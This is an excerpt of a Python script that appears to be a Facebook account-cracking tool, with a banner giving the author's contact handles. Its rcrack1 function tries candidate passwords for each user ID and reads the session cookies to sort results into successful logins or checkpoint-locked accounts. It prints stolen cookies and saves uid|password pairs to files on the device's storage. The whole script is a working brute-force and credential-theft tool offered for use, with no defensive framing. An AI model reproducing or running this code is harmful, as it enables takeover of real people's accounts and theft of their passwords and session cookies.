...
logo = ("""\033[1;37m
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : 𝐁𝐚𝐬𝐡𝐚𝐫 𝐀𝐡𝐦𝐚𝐝𝐳𝐚𝐢            │
    │ [✓] GITHUB   : 𝐛𝐚𝐬𝐡𝐚𝐫𝐚𝐡𝐦𝐚𝐝𝐳𝐚𝐢002                │
    │ [✓] WHATSAPP : +93782989190         │
    │ [✓] telegram: \033[1;32m @bashar_ahmadzai12 \033[1;37m           │
    └───────────────────────────────────────┘""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m𝐵𝑎𝑠𝒉𝑎𝑟\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" \n Cookie : {coki}")
                open('/sdcard/𝐵𝑎𝑠𝒉𝑎𝑟/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[𝐵𝑎𝑠𝒉𝑎𝑟 𝐶𝑃] {cid}|{ps}")
                open('/sdcard/bashar.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[𝐵𝑎𝑠𝒉𝑎𝑟] \033[1;92m%s\033[m |\033[m[\033[m𝑂𝐾:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()